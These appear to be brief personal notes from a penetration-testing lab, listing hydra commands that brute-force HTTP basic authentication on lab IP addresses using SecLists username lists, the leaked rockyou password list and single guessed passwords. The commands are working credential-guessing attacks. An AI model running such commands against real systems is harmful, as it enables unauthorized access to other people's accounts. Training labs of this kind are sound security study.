# Username Brute Force

locate rockyou.txt
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt


locate names.txt
/opt/useful/SecLists/Usernames/Names/names.txt

## Username/Password Attack

hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

## Username Brute Force

hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

## LAB

83.136.250.104:48522


hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p admin -u -f 83.136.250.104 -s 48522 http-get /
